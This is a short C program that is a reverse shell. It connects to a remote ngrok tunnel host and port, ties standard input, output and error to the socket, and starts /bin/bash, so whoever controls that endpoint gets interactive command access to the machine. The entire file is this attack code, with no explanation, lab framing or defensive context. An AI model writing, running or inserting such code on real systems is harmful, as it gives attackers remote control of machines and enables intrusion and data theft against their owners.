#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>

#define REMOTE_ADDR "0.tcp.ngrok.io"
#define REMOTE_PORT 19657

#define closesocket(s) close(s)
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct sockaddr SOCKADDR;
typedef struct in_addr IN_ADDR;

int	main()
{
	int serv_socket = socket(AF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN server_address = {0};
	struct hostent *hostinfo = NULL;

	hostinfo = gethostbyname(REMOTE_ADDR);
	if (hostinfo == NULL)
	{
		printf("Unknow host %s.\n", REMOTE_ADDR);
		closesocket(serv_socket);
		exit(EXIT_FAILURE);
	}

	server_address.sin_addr = *(IN_ADDR *) hostinfo->h_addr;
	server_address.sin_port = htons(REMOTE_PORT);
	server_address.sin_family = AF_INET;

	connect(serv_socket, (SOCKADDR *) &server_address, sizeof(SOCKADDR));
	dup2(serv_socket, 0);
	dup2(serv_socket, 1);
	dup2(serv_socket, 2);

	execv("/bin/bash", NULL);
	
	closesocket(serv_socket);
	return 0;
}
